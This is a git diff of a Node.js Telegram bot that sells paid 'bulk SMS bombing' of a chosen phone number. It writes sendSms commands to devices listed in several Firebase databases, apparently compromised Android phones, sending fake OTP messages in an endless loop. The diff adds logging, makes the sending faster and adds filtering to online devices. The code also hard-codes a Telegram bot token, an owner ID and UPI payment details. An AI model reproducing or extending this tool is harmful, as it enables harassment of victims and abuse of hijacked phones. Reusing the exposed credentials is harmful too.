@@ -1,6 +1,7 @@
 #!/usr/bin/env node
-// 🔥 BULK SMS BOT - NODE.JS (FIXED for RENDER) 🔥
+// 🔥 BULK SMS BOT - COMPLETE FIXED VERSION 🔥
 // Developer: @RTFGAMMING
+// Logging Channel: Every 1 minute
 
 const { Telegraf, session, Markup } = require('telegraf');
 const sqlite3 = require('sqlite3').verbose();
@@ -14,27 +15,35 @@ const path = require('path');
 // CONFIGURATION
 // ============================
 const TOKEN = '8212356485:AAGQNG75v9YA1sryNfX6zSbEQgpWM_oYMHI';
+const OWNER_ID = 6346250222;  // 👈 @RTFGAMMING ki ID
 
-// ⚠️ IMPORTANT: Replace this with your actual Telegram User ID
-// How to get: Send /start to @userinfobot on Telegram
-const OWNER_ID = 6346250222;  // 👈 Replace with your ID (the one you use on Telegram)
+// 🔥 LOGGING CHANNEL - YAHAN APNA CHANNEL USERNAME DAALEIN
+// Channel banayein: @yourchannelusername
+// Channel ko bot admin banayein
+const LOG_CHANNEL = '@loggsnsns';  // 👈 CHANGE KARO
 
-const FIREBASE_URLS = [
-    "https://dusman-abf8b-default-rtdb.firebaseio.com",
-    "https://hood-4ba1e-default-rtdb.firebaseio.com",
-    "https://lucifer-spreader-default-rtdb.firebaseio.com",
-    "https://totla-axis-default-rtdb.firebaseio.com",
-    "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
-    "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
-    "https://systumm-c8526-default-rtdb.firebaseio.com",
-    "https://ravan-98ef1-default-rtdb.firebaseio.com"
-];
-
+// UPI Configuration
 const UPI_ID = "70497398@axl";
 const UPI_NAME = "BRAJENDRA TYAGI";
 
 // ============================
-// EXPRESS SERVER (for Render port binding)
+// LOAD FIREBASE URLs FROM JSON FILE
+// ============================
+let FIREBASE_CONFIG = [];
+
+try {
+    const configPath = path.join(__dirname, 'firebase-config.json');
+    const configData = fs.readFileSync(configPath, 'utf8');
+    const config = JSON.parse(configData);
+    FIREBASE_CONFIG = config.urls || [];
+    console.log(`✅ Loaded ${FIREBASE_CONFIG.length} Firebase URLs from config`);
+} catch (err) {
+    console.error('❌ Failed to load firebase-config.json:', err.message);
+    FIREBASE_CONFIG = [];
+}
+
+// ============================
+// EXPRESS SERVER (for Render)
 // ============================
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -85,13 +94,20 @@ const initDB = () => {
             details TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )`);
+        db.run(`CREATE TABLE IF NOT EXISTS bot_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            log_type TEXT,
+            message TEXT,
+            user_id INTEGER,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )`);
     });
     console.log('✅ Database initialized at:', DB_PATH);
 };
 initDB();
 
 // ============================
-// DATABASE FUNCTIONS (Promisified)
+// DATABASE FUNCTIONS
 // ============================
 const dbGet = promisify(db.get.bind(db));
 const dbRun = promisify(db.run.bind(db));
@@ -177,6 +193,79 @@ const getUserHistory = async (userId, limit = 10) => {
 };
 
 // ============================
+// LOGGING FUNCTIONS
+// ============================
+const saveLog = async (logType, message, userId = null) => {
+    try {
+        await dbRun(
+            "INSERT INTO bot_logs (log_type, message, user_id) VALUES (?, ?, ?)",
+            [logType, message, userId]
+        );
+    } catch (err) {
+        console.error('Log save error:', err);
+    }
+};
+
+let logBuffer = [];
+let logInterval = null;
+
+const sendLogsToChannel = async (bot) => {
+    if (logBuffer.length === 0) return;
+    
+    try {
+        const logsToSend = [...logBuffer];
+        logBuffer = [];
+        
+        // Format logs
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        let logMessage = `📋 **BOT LOGS** - ${timestamp}\n`;
+        logMessage += `━─━────༺༻────━─━\n`;
+        
+        // Limit logs to prevent message too long
+        const maxLogs = logsToSend.slice(0, 20);
+        for (const log of maxLogs) {
+            const time = log.time || new Date().toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' });
+            logMessage += `🕐 ${time}\n`;
+            logMessage += `📌 ${log.type}: ${log.message}\n`;
+            if (log.userId) logMessage += `👤 User: ${log.userId}\n`;
+            logMessage += `─\n`;
+        }
+        
+        if (logsToSend.length > 20) {
+            logMessage += `\n... and ${logsToSend.length - 20} more logs`;
+        }
+        
+        // Send to channel
+        await bot.telegram.sendMessage(LOG_CHANNEL, logMessage, { parse_mode: 'HTML' });
+        
+        // Delete old logs from database (keep last 1000)
+        await dbRun("DELETE FROM bot_logs WHERE id IN (SELECT id FROM bot_logs ORDER BY id DESC LIMIT -1 OFFSET 1000)");
+        
+    } catch (err) {
+        console.error('Failed to send logs to channel:', err.message);
+    }
+};
+
+// Start log interval (every 1 minute)
+const startLogInterval = (bot) => {
+    if (logInterval) clearInterval(logInterval);
+    logInterval = setInterval(() => {
+        sendLogsToChannel(bot);
+    }, 60000); // 1 minute
+};
+
+const addLog = async (type, message, userId = null) => {
+    const timestamp = new Date().toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' });
+    logBuffer.push({ type, message, userId, time: timestamp });
+    await saveLog(type, message, userId);
+    
+    // If buffer is too large, send immediately
+    if (logBuffer.length >= 30) {
+        await sendLogsToChannel(bot);
+    }
+};
+
+// ============================
 // HELPER FUNCTIONS
 // ============================
 const generateOTP = (length = 6) => {
@@ -198,23 +287,30 @@ const validatePhoneNumber = (number) => {
     return { valid: true, msg: '✅ Valid number' };
 };
 
+// ============================
+// FIREBASE FUNCTIONS
+// ============================
 const fetchJsonData = async (url, path, auth = null) => {
     try {
         const base = url.replace(/\/+$/, '');
         let fullUrl = `${base}/${path}.json`;
-        if (auth && auth.trim()) fullUrl += `?auth=${auth}`;
+        if (auth && auth.trim()) {
+            fullUrl += `?auth=${auth}`;
+        }
         const response = await axios.get(fullUrl, { timeout: 10000 });
         return response.data;
-    } catch {
+    } catch (err) {
         return null;
     }
 };
 
-const firebasePut = async (url, key, path, data) => {
+const firebasePut = async (url, auth, path, data) => {
     try {
         const base = url.replace(/\/+$/, '');
         let fullUrl = `${base}/${path}.json`;
-        if (key && key.trim()) fullUrl += `?auth=${key}`;
+        if (auth && auth.trim()) {
+            fullUrl += `?auth=${auth}`;
+        }
         await axios.put(fullUrl, data, { timeout: 10000 });
         return true;
     } catch {
@@ -236,23 +332,32 @@ const getMainKeyboard = () => {
 };
 
 // ============================
-// BOT SETUP (with session)
+// BOT SETUP
 // ============================
 const bot = new Telegraf(TOKEN);
 
-// ⚡ CRITICAL: Session middleware (MUST be first)
+// Session middleware
 bot.use(session());
 
-// ⚡ Custom middleware
+// Custom middleware
 bot.use(async (ctx, next) => {
+    if (!ctx.session) ctx.session = {};
+    
     if (ctx.chat && ctx.chat.type === 'private') {
         ctx.userId = ctx.from.id;
         const banned = await isUserBanned(ctx.userId);
         if (banned) {
+            await addLog('BANNED_ACCESS', `Banned user tried to access`, ctx.userId);
             return ctx.reply('❌ You are banned from using this bot.');
         }
     }
     return next();
+});
+
+// Start log interval when bot starts
+bot.telegram.getMe().then(() => {
+    startLogInterval(bot);
+    addLog('SYSTEM', '✅ Bot started successfully');
 });
 
 // ============================
@@ -267,7 +372,11 @@ bot.start(async (ctx) => {
     }
     await addNewUser(userId, referrerId);
     const credits = await getUserCredits(userId);
-    const username = ctx.botInfo.username;
+
+    await addLog('START', `User started bot`, userId);
+    if (referrerId) {
+        await addLog('REFERRAL', `User ${userId} referred by ${referrerId}`, userId);
+    }
 
     const welcome = `⚡ **BULK SMS BOT** ⚡\n` +
         `━─━────༺༻────━─━\n` +
@@ -289,18 +398,25 @@ bot.start(async (ctx) => {
 bot.on('text', async (ctx) => {
     const userId = ctx.from.id;
     const text = ctx.message.text;
-    const session = ctx.session || {};
-    ctx.session = session;
+    
+    if (!ctx.session) ctx.session = {};
+    const session = ctx.session;
 
-    // Bulk SMS flow
+    await addLog('TEXT_RECEIVED', `Text: "${text}"`, userId);
+
+    // ---------- Bulk SMS flow ----------
     if (session.bulkStep === 'number') {
+        await addLog('BULK_STEP', `Number received: ${text}`, userId);
+        
         const number = text.trim();
         const validation = validatePhoneNumber(number);
         if (!validation.valid) {
+            await addLog('BULK_ERROR', `Invalid number: ${text}`, userId);
             return ctx.reply(`${validation.msg}\n\n📞 Format: +91XXXXXXXXXX\nExample: +919876543210`, 
                             { parse_mode: 'HTML' });
         }
         session.bulkNumber = number;
+        await addLog('BULK_NUMBER', `Valid number: ${number}`, userId);
 
         const keyboard = Markup.inlineKeyboard([
             [Markup.button.callback('🔢 Random OTP', 'msgtype_random')],
@@ -314,27 +430,38 @@ bot.on('text', async (ctx) => {
 
     if (session.bulkStep === 'custom_msg') {
         const msgText = text;
-        if (!msgText) return ctx.reply('❌ Message cannot be empty.');
+        if (!msgText) {
+            await addLog('BULK_ERROR', 'Empty message received', userId);
+            return ctx.reply('❌ Message cannot be empty.');
+        }
         session.customMessage = msgText;
+        await addLog('BULK_MSG', `Custom message: ${msgText.substring(0, 50)}...`, userId);
 
         const deducted = await deductCredit(userId);
         if (!deducted) {
+            await addLog('BULK_ERROR', `Insufficient credits for user ${userId}`, userId);
             return ctx.reply('❌ Failed to deduct credit. Insufficient balance.');
         }
 
         await logUserAction(userId, 'Bulk SMS Started', `Target: ${session.bulkNumber}`);
+        await addLog('BULK_START', `Starting bulk SMS to ${session.bulkNumber}`, userId);
         await ctx.reply('📤 **Starting infinite bulk SMS...**');
         await performBulkSend(ctx);
         return;
     }
 
-    // Recharge flow
+    // ---------- Recharge flow ----------
     if (session.rechargeStep === 'payment') {
         if (text && !text.startsWith('/')) {
             const txnId = text.trim();
             const credits = session.rechargeCredits || 0;
             const amount = session.rechargeAmount || 0;
-            if (credits === 0) return ctx.reply('❌ Session expired. Start /start again.');
+            if (credits === 0) {
+                await addLog('RECHARGE_ERROR', 'Session expired', userId);
+                return ctx.reply('❌ Session expired. Start /start again.');
+            }
+            
+            await addLog('RECHARGE_TXN', `Txn ID: ${txnId}, Credits: ${credits}, Amount: ₹${amount}`, userId);
             
             const paymentId = await createPayment(userId, amount, credits, txnId);
             await ctx.reply(`✅ Transaction ID received: \`${txnId}\`\nPayment ID: #${paymentId}\n⏳ Waiting for owner approval.`);
@@ -344,7 +471,10 @@ bot.on('text', async (ctx) => {
                     `📥 **New Payment (Txn ID)**\nUser: ${userId}\nAmount: ₹${amount}\nCredits: ${credits}\nTxn: ${txnId}\nPayment ID: #${paymentId}`,
                     { parse_mode: 'HTML' }
                 );
-            } catch {}
+                await addLog('RECHARGE_NOTIFY', `Owner notified for payment #${paymentId}`, userId);
+            } catch (err) {
+                await addLog('RECHARGE_ERROR', `Failed to notify owner: ${err.message}`, userId);
+            }
             
             await logUserAction(userId, 'Recharge Request', `${credits} credits for ₹${amount} (txn: ${txnId})`);
             session.rechargeStep = null;
@@ -355,11 +485,13 @@ bot.on('text', async (ctx) => {
         return;
     }
 
-    // Main menu buttons
+    // ---------- Main menu buttons ----------
     switch(text) {
         case '📱 Bulk SMS': {
             const credits = await getUserCredits(userId);
+            await addLog('BUTTON', 'Bulk SMS button clicked', userId);
             if (credits <= 0) {
+                await addLog('BULK_ERROR', `Insufficient credits: ${credits}`, userId);
                 return ctx.reply('❌ **Insufficient credits!**\nInvite friends or recharge.', 
                                 { parse_mode: 'HTML' });
             }
@@ -371,6 +503,7 @@ bot.on('text', async (ctx) => {
         
         case '💰 Credits': {
             const credits = await getUserCredits(userId);
+            await addLog('BUTTON', 'Credits check', userId);
             await ctx.reply(`💰 **Your Credits:** \`${credits}\``, { parse_mode: 'HTML' });
             break;
         }
@@ -378,12 +511,14 @@ bot.on('text', async (ctx) => {
         case '🔗 Referral': {
             const username = ctx.botInfo.username;
             const link = `https://t.me/${username}?start=ref_${userId}`;
+            await addLog('BUTTON', 'Referral link generated', userId);
             await ctx.reply(`🔗 **Your Referral Link:**\n\`${link}\`\n\nShare this link – you get **1 credit** per new user!`,
                            { parse_mode: 'HTML' });
             break;
         }
         
         case '💳 Recharge': {
+            await addLog('BUTTON', 'Recharge button clicked', userId);
             const keyboard = Markup.inlineKeyboard([
                 [Markup.button.callback('💳 10 Credits - ₹20', 'recharge_10_20')],
                 [Markup.button.callback('💎 25 Credits - ₹50', 'recharge_25_50')],
@@ -396,6 +531,7 @@ bot.on('text', async (ctx) => {
         }
         
         case '📜 My History': {
+            await addLog('BUTTON', 'History viewed', userId);
             const history = await getUserHistory(userId, 10);
             if (!history || history.length === 0) {
                 return ctx.reply('📭 No activity history.');
@@ -409,13 +545,46 @@ bot.on('text', async (ctx) => {
             break;
         }
         
-        case '🛡️ System Status':
-            await ctx.reply('🟢 **Bot is running on Node.js!**');
-            break;
+        case '🛡️ System Status': {
+            await addLog('BUTTON', 'System status checked', userId);
+            let statusReply = '🟢 **Bot Status:** Running\n\n';
+            statusReply += `📊 **Total Firebase URLs:** ${FIREBASE_CONFIG.length}\n\n`;
             
-        case '👨‍💻 Developer':
+            // Check online devices count
+            let totalOnline = 0;
+            let totalDevices = 0;
+            let workingUrls = 0;
+            
+            for (const config of FIREBASE_CONFIG) {
+                try {
+                    const clients = await fetchJsonData(config.url, '/clients', config.auth);
+                    if (clients && typeof clients === 'object') {
+                        const deviceCount = Object.keys(clients).length;
+                        totalDevices += deviceCount;
+                        workingUrls++;
+                        for (const [id, data] of Object.entries(clients)) {
+                            if (data && data.online === true) totalOnline++;
+                        }
+                    }
+                } catch (err) {
+                    await addLog('SYSTEM_ERROR', `Failed to fetch ${config.url}: ${err.message}`);
+                }
+            }
+            
+            statusReply += `📱 **Total Devices:** ${totalDevices}\n`;
+            statusReply += `🟢 **Online:** ${totalOnline}\n`;
+            statusReply += `⚫ **Offline:** ${totalDevices - totalOnline}\n`;
+            statusReply += `📡 **Active URLs:** ${workingUrls}/${FIREBASE_CONFIG.length}`;
+            
+            await ctx.reply(statusReply);
+            break;
+        }
+            
+        case '👨‍💻 Developer': {
+            await addLog('BUTTON', 'Developer info viewed', userId);
             await ctx.reply('👨‍💻 **Developer:** @RTFGAMMING\nFor support or custom bots, contact the developer.');
             break;
+        }
             
         default:
             await ctx.reply('❌ Please use the buttons below.', getMainKeyboard());
@@ -423,18 +592,26 @@ bot.on('text', async (ctx) => {
 });
 
 // ============================
-// PHOTO HANDLER (Recharge Screenshots)
+// PHOTO HANDLER
 // ============================
 bot.on('photo', async (ctx) => {
     const userId = ctx.from.id;
-    const session = ctx.session || {};
+    if (!ctx.session) ctx.session = {};
+    const session = ctx.session;
+    
+    await addLog('PHOTO', 'Photo received', userId);
     
     if (session.rechargeStep === 'payment') {
         const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
         const credits = session.rechargeCredits || 0;
         const amount = session.rechargeAmount || 0;
         
-        if (credits === 0) return ctx.reply('❌ Session expired. Start /start again.');
+        if (credits === 0) {
+            await addLog('RECHARGE_ERROR', 'Session expired for photo', userId);
+            return ctx.reply('❌ Session expired. Start /start again.');
+        }
+        
+        await addLog('RECHARGE_SCREENSHOT', `Screenshot received, Credits: ${credits}, Amount: ₹${amount}`, userId);
         
         const paymentId = await createPayment(userId, amount, credits, null, fileId);
         await ctx.reply(`✅ Screenshot received! Payment ID: #${paymentId}\n⏳ Waiting for owner approval.`);
@@ -444,7 +621,10 @@ bot.on('photo', async (ctx) => {
                 `📥 **New Payment Screenshot**\nUser: ${userId}\nAmount: ₹${amount}\nCredits: ${credits}\nPayment ID: #${paymentId}`,
                 { parse_mode: 'HTML' }
             );
-        } catch {}
+            await addLog('RECHARGE_NOTIFY', `Owner notified for payment #${paymentId}`, userId);
+        } catch (err) {
+            await addLog('RECHARGE_ERROR', `Failed to notify owner: ${err.message}`, userId);
+        }
         
         await logUserAction(userId, 'Recharge Request', `${credits} credits for ₹${amount} (screenshot)`);
         session.rechargeStep = null;
@@ -458,7 +638,11 @@ bot.on('photo', async (ctx) => {
 // ============================
 bot.action(/recharge_(.+)/, async (ctx) => {
     const userId = ctx.from.id;
+    if (!ctx.session) ctx.session = {};
+    const session = ctx.session;
     const data = ctx.match[0];
+    
+    await addLog('CALLBACK', `Recharge callback: ${data}`, userId);
     
     if (data === 'recharge_cancel') {
         await ctx.editMessageText('❌ Recharge cancelled.');
@@ -469,8 +653,8 @@ bot.action(/recharge_(.+)/, async (ctx) => {
     const credits = parseInt(parts[1]);
     const amount = parseInt(parts[2]);
     
-    ctx.session.rechargeCredits = credits;
-    ctx.session.rechargeAmount = amount;
+    session.rechargeCredits = credits;
+    session.rechargeAmount = amount;
     
     let reply = `💰 **Plan: ${credits} Credits**\n💵 **Amount: ₹${amount}**\n\n`;
     reply += `📱 **Send payment to UPI:** \`${UPI_ID}\`\n`;
@@ -479,50 +663,60 @@ bot.action(/recharge_(.+)/, async (ctx) => {
     reply += '⚠️ Your credits will be added after manual verification by owner.';
     
     await ctx.editMessageText(reply, { parse_mode: 'HTML' });
-    ctx.session.rechargeStep = 'payment';
+    session.rechargeStep = 'payment';
 });
 
 bot.action(/msgtype_(.+)/, async (ctx) => {
     const userId = ctx.from.id;
+    if (!ctx.session) ctx.session = {};
+    const session = ctx.session;
     const data = ctx.match[0];
     const msgType = data.split('_')[1];
     
+    await addLog('CALLBACK', `Message type: ${msgType}`, userId);
+    
     if (msgType === 'cancel') {
         await ctx.editMessageText('❌ Bulk SMS cancelled.');
-        ctx.session.bulkStep = null;
+        session.bulkStep = null;
         return;
     }
     
     if (msgType === 'random') {
         const defaultMsg = 'आपका OTP है: {otp} | कृपया इसे किसी को न बताएँ।';
-        ctx.session.customMessage = defaultMsg;
+        session.customMessage = defaultMsg;
         await ctx.editMessageText('✅ Using default OTP template.\n\n📤 **Starting infinite bulk SMS...**');
         
         const deducted = await deductCredit(userId);
         if (!deducted) {
+            await addLog('BULK_ERROR', `Insufficient credits for user ${userId}`, userId);
             return ctx.reply('❌ Failed to deduct credit. Insufficient balance.');
         }
-        await logUserAction(userId, 'Bulk SMS Started', `Target: ${ctx.session.bulkNumber}`);
+        await logUserAction(userId, 'Bulk SMS Started', `Target: ${session.bulkNumber}`);
+        await addLog('BULK_START', `Starting random OTP bulk SMS to ${session.bulkNumber}`, userId);
         await performBulkSend(ctx);
     } else {
         await ctx.editMessageText('✏️ **Now enter your custom message.**\n💡 Use `{otp}` for random OTP if needed.');
-        ctx.session.bulkStep = 'custom_msg';
+        session.bulkStep = 'custom_msg';
     }
 });
 
 bot.action('stop_bulk', async (ctx) => {
+    if (!ctx.session) ctx.session = {};
     ctx.session.stopSending = true;
+    await addLog('BULK_STOP', 'User stopped bulk SMS', ctx.from.id);
     await ctx.answerCbQuery('Stopping...');
 });
 
 // ============================
-// PERFORM BULK SEND
+// PERFORM BULK SEND (FIXED)
 // ============================
 const performBulkSend = async (ctx) => {
     const userId = ctx.from.id;
+    if (!ctx.session) ctx.session = {};
     const session = ctx.session;
     
     if (await isUserBanned(userId)) {
+        await addLog('BULK_ERROR', 'Banned user tried to send SMS', userId);
         return ctx.reply('❌ You are banned.');
     }
     
@@ -530,6 +724,7 @@ const performBulkSend = async (ctx) => {
     const msgText = session.customMessage;
     
     if (!number || !msgText) {
+        await addLog('BULK_ERROR', 'Missing data for bulk send', userId);
         return ctx.reply('❌ Missing data. Please start again.');
     }
     
@@ -544,6 +739,7 @@ const performBulkSend = async (ctx) => {
     let totalSent = 0;
     let totalFailed = 0;
     let cycle = 1;
+    let totalDevices = 0;
     
     const otpMatch = msgText.match(/\{otp(:\d+)?\}/);
     let otpLength = 6;
@@ -551,6 +747,8 @@ const performBulkSend = async (ctx) => {
         otpLength = parseInt(otpMatch[1].slice(1)) || 6;
         otpLength = Math.max(1, Math.min(10, otpLength));
     }
+    
+    await addLog('BULK_SEND', `Starting bulk send to ${number}`, userId);
     
     while (!session.stopSending) {
         if (await isUserBanned(userId)) break;
@@ -566,50 +764,75 @@ const performBulkSend = async (ctx) => {
             );
         } catch {}
         
-        for (const url of FIREBASE_URLS) {
+        for (const config of FIREBASE_CONFIG) {
             if (session.stopSending || await isUserBanned(userId)) break;
             
-            const clients = await fetchJsonData(url, '/clients');
-            if (!clients || typeof clients !== 'object') continue;
+            const { url, auth } = config;
             
-            const deviceIds = Object.keys(clients);
-            if (deviceIds.length === 0) continue;
-            
-            for (const devId of deviceIds) {
-                if (session.stopSending || await isUserBanned(userId)) break;
+            try {
+                const clients = await fetchJsonData(url, '/clients', auth);
+                if (!clients || typeof clients !== 'object') continue;
                 
-                let finalMsg = msgText;
-                if (otpMatch) {
-                    const otp = generateOTP(otpLength);
-                    finalMsg = msgText.replace(/\{otp(:\d+)?\}/g, otp);
+                const deviceIds = Object.keys(clients);
+                totalDevices += deviceIds.length;
+                
+                // Filter online devices
+                const onlineDevices = [];
+                for (const [devId, data] of Object.entries(clients)) {
+                    if (data && data.online === true) {
+                        onlineDevices.push(devId);
+                    }
                 }
                 
-                const path = `clients/${devId}/webhookEvent/sendSms`;
-                const payload = {
-                    sim: 1,
-                    to: number,
-                    message: finalMsg,
-                    isSended: false
-                };
+                // If no online devices, skip
+                if (onlineDevices.length === 0) continue;
                 
-                const ok = await firebasePut(url, null, path, payload);
-                if (ok) totalSent++;
-                else totalFailed++;
+                await addLog('BULK_CYCLE', `Cycle ${cycle}: ${onlineDevices.length} online devices`, userId);
                 
-                if ((totalSent + totalFailed) % 10 === 0) {
-                    const progressText = `📤 **Bombing...**\n${cycleText}\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
-                    try {
-                        await ctx.telegram.editMessageText(
-                            progressMsg.chat.id,
-                            progressMsg.message_id,
-                            null,
-                            progressText,
-                            { parse_mode: 'HTML', reply_markup: stopMarkup.reply_markup }
-                        );
-                    } catch {}
+                for (const devId of onlineDevices) {
+                    if (session.stopSending || await isUserBanned(userId)) break;
+                    
+                    let finalMsg = msgText;
+                    if (otpMatch) {
+                        const otp = generateOTP(otpLength);
+                        finalMsg = msgText.replace(/\{otp(:\d+)?\}/g, otp);
+                    }
+                    
+                    const path = `clients/${devId}/webhookEvent/sendSms`;
+                    const payload = {
+                        sim: 1,
+                        to: number,
+                        message: finalMsg,
+                        isSended: false
+                    };
+                    
+                    const ok = await firebasePut(url, auth, path, payload);
+                    if (ok) {
+                        totalSent++;
+                        await addLog('SMS_SENT', `SMS sent via ${devId} to ${number}`, userId);
+                    } else {
+                        totalFailed++;
+                        await addLog('SMS_FAILED', `Failed to send via ${devId}`, userId);
+                    }
+                    
+                    if ((totalSent + totalFailed) % 5 === 0) {
+                        const progressText = `📤 **Bombing...**\n${cycleText}\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
+                        try {
+                            await ctx.telegram.editMessageText(
+                                progressMsg.chat.id,
+                                progressMsg.message_id,
+                                null,
+                                progressText,
+                                { parse_mode: 'HTML', reply_markup: stopMarkup.reply_markup }
+                            );
+                        } catch {}
+                    }
+                    
+                    // Reduced delay for faster sending
+                    await new Promise(r => setTimeout(r, 20));
                 }
-                
-                await new Promise(r => setTimeout(r, 50));
+            } catch (err) {
+                await addLog('FIREBASE_ERROR', `${url}: ${err.message}`, userId);
             }
         }
         
@@ -624,7 +847,7 @@ const performBulkSend = async (ctx) => {
                 { parse_mode: 'HTML', reply_markup: stopMarkup.reply_markup }
             );
         } catch {}
-        await new Promise(r => setTimeout(r, 500));
+        await new Promise(r => setTimeout(r, 300));
     }
     
     const finalText = `🛑 **Bulk SMS stopped.**\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
@@ -644,6 +867,7 @@ const performBulkSend = async (ctx) => {
         );
     } catch {}
     
+    await addLog('BULK_END', `Completed: ${totalSent} sent, ${totalFailed} failed, Total devices: ${totalDevices}`, userId);
     await logUserAction(userId, 'Bulk SMS Ended', `Sent ${totalSent}, Failed ${totalFailed}`);
     session.stopSending = null;
 };
@@ -652,10 +876,11 @@ const performBulkSend = async (ctx) => {
 // CANCEL COMMAND
 // ============================
 bot.command('cancel', async (ctx) => {
-    const session = ctx.session || {};
-    session.bulkStep = null;
-    session.rechargeStep = null;
-    session.stopSending = true;
+    if (!ctx.session) ctx.session = {};
+    ctx.session.bulkStep = null;
+    ctx.session.rechargeStep = null;
+    ctx.session.stopSending = true;
+    await addLog('CANCEL', 'User cancelled operation', ctx.from.id);
     await ctx.reply('❌ Cancelled. Use the buttons to start again.', getMainKeyboard());
 });
 
@@ -664,82 +889,120 @@ bot.command('cancel', async (ctx) => {
 // ============================
 bot.command('addcredits', async (ctx) => {
     const userId = ctx.from.id;
-    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
+    if (!isOwner(userId)) {
+        await addLog('UNAUTHORIZED', 'Unauthorized /addcredits attempt', userId);
+        return ctx.reply('⛔ Unauthorized.');
+    }
     
     const args = ctx.message.text.split(' ');
-    if (args.length < 3) return ctx.reply('Usage: /addcredits <user_id> <amount>');
+    if (args.length < 3) {
+        await addLog('OWNER_CMD', 'Incorrect usage of /addcredits', userId);
+        return ctx.reply('Usage: /addcredits <user_id> <amount>');
+    }
     
     try {
         const target = parseInt(args[1]);
         const amount = parseInt(args[2]);
         await addCredits(target, amount);
+        await addLog('OWNER_CMD', `Added ${amount} credits to user ${target}`, userId);
         await ctx.reply(`✅ Added ${amount} credits to user ${target}.`);
     } catch {
+        await addLog('OWNER_CMD', 'Invalid input for /addcredits', userId);
         await ctx.reply('❌ Invalid input.');
     }
 });
 
 bot.command('removecredits', async (ctx) => {
     const userId = ctx.from.id;
-    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
+    if (!isOwner(userId)) {
+        await addLog('UNAUTHORIZED', 'Unauthorized /removecredits attempt', userId);
+        return ctx.reply('⛔ Unauthorized.');
+    }
     
     const args = ctx.message.text.split(' ');
-    if (args.length < 3) return ctx.reply('Usage: /removecredits <user_id> <amount>');
+    if (args.length < 3) {
+        await addLog('OWNER_CMD', 'Incorrect usage of /removecredits', userId);
+        return ctx.reply('Usage: /removecredits <user_id> <amount>');
+    }
     
     try {
         const target = parseInt(args[1]);
         const amount = parseInt(args[2]);
         const success = await removeCredits(target, amount);
         if (success) {
+            await addLog('OWNER_CMD', `Removed ${amount} credits from user ${target}`, userId);
             await ctx.reply(`✅ Removed ${amount} credits from user ${target}.`);
         } else {
+            await addLog('OWNER_CMD', `Failed to remove credits from user ${target}`, userId);
             await ctx.reply(`❌ Failed. User may have insufficient credits.`);
         }
     } catch {
+        await addLog('OWNER_CMD', 'Invalid input for /removecredits', userId);
         await ctx.reply('❌ Invalid input.');
     }
 });
 
 bot.command('ban', async (ctx) => {
     const userId = ctx.from.id;
-    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
+    if (!isOwner(userId)) {
+        await addLog('UNAUTHORIZED', 'Unauthorized /ban attempt', userId);
+        return ctx.reply('⛔ Unauthorized.');
+    }
     
     const args = ctx.message.text.split(' ');
-    if (args.length < 2) return ctx.reply('Usage: /ban <user_id>');
+    if (args.length < 2) {
+        await addLog('OWNER_CMD', 'Incorrect usage of /ban', userId);
+        return ctx.reply('Usage: /ban <user_id>');
+    }
     
     try {
         const target = parseInt(args[1]);
         await banUser(target, userId);
+        await addLog('OWNER_CMD', `Banned user ${target}`, userId);
         await ctx.reply(`✅ User ${target} banned.`);
     } catch {
+        await addLog('OWNER_CMD', 'Invalid input for /ban', userId);
         await ctx.reply('❌ Invalid user ID.');
     }
 });
 
 bot.command('unban', async (ctx) => {
     const userId = ctx.from.id;
-    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
+    if (!isOwner(userId)) {
+        await addLog('UNAUTHORIZED', 'Unauthorized /unban attempt', userId);
+        return ctx.reply('⛔ Unauthorized.');
+    }
     
     const args = ctx.message.text.split(' ');
-    if (args.length < 2) return ctx.reply('Usage: /unban <user_id>');
+    if (args.length < 2) {
+        await addLog('OWNER_CMD', 'Incorrect usage of /unban', userId);
+        return ctx.reply('Usage: /unban <user_id>');
+    }
     
     try {
         const target = parseInt(args[1]);
         const success = await unbanUser(target);
         if (success) {
+            await addLog('OWNER_CMD', `Unbanned user ${target}`, userId);
             await ctx.reply(`✅ User ${target} unbanned.`);
         } else {
+            await addLog('OWNER_CMD', `User ${target} was not banned`, userId);
             await ctx.reply('❌ User was not banned.');
         }
     } catch {
+        await addLog('OWNER_CMD', 'Invalid input for /unban', userId);
         await ctx.reply('❌ Invalid user ID.');
     }
 });
 
 bot.command('shutdown', async (ctx) => {
     const userId = ctx.from.id;
-    if (!isOwner(userId)) return ctx.reply('⛔ Unauthorized.');
+    if (!isOwner(userId)) {
+        await addLog('UNAUTHORIZED', 'Unauthorized /shutdown attempt', userId);
+        return ctx.reply('⛔ Unauthorized.');
+    }
     
+    await addLog('SYSTEM', 'Bot shutting down', userId);
     await ctx.reply('🛑 Bot is shutting down...');
     process.exit(0);
 });
@@ -747,8 +1010,12 @@ bot.command('shutdown', async (ctx) => {
 // ============================
 // ERROR HANDLER
 // ============================
-bot.catch((err, ctx) => {
+bot.catch(async (err, ctx) => {
     console.error('Bot error:', err);
+    await addLog('ERROR', `Bot error: ${err.message}`);
+    if (ctx) {
+        await ctx.reply('⚠️ An error occurred. Please try again.');
+    }
 });
 
 // ============================
@@ -761,15 +1028,25 @@ bot.launch().then(() => {
 ║  ✅ Database: ${DB_PATH}                       ║
 ║  ✅ HTTP Server: Port ${PORT}                  ║
 ║  ✅ Developer: @RTFGAMMING                     ║
+║  ✅ Logging Channel: ${LOG_CHANNEL}            ║
 ║  ✅ Ready for Production!                      ║
 ╚════════════════════════════════════════════════╝
     `);
+    addLog('SYSTEM', 'Bot started successfully');
 }).catch(err => {
     console.error('Failed to start bot:', err);
 });
 
 // Graceful shutdown
-process.once('SIGINT', () => { bot.stop('SIGINT'); db.close(); });
